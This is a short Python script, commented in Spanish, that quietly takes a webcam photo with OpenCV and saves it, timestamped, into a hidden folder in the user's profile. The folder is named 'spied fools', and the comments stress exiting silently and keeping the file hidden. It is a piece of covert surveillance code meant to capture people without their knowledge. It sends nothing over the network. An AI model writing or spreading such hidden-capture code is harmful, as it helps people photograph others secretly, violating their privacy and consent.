import cv2
import datetime
import os

# inicializar la cámara
cap = cv2.VideoCapture(0)


if not cap.isOpened():
    exit() # salir silenciosamente si no se puede abrir la cámara

# capturar una imagen
ret, frame = cap.read()

# verificar si la captura fue exitosa
if not ret:
    exit()  # Salir silenciosamente si no se puede recibir frame

# obtendremos la fecha y hora actual jaja
timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

# crear y obtener la ruta de la carpeta oculta "cvad"
user_profile = os.environ['USERPROFILE']
cvad_path = os.path.join(user_profile, '.snawf', 'spied fools')
os.makedirs(cvad_path, exist_ok=True)

# guardar la imagen en la carpeta oculta
filename = os.path.join(cvad_path, f"photo_{timestamp}.png")
cv2.imwrite(filename, frame)

if os.path.exists(filename):
    print(f"hey imagen guardada exitosamente como {filename}")
else:
    print("Error al guardar la imagen")


cap.release()
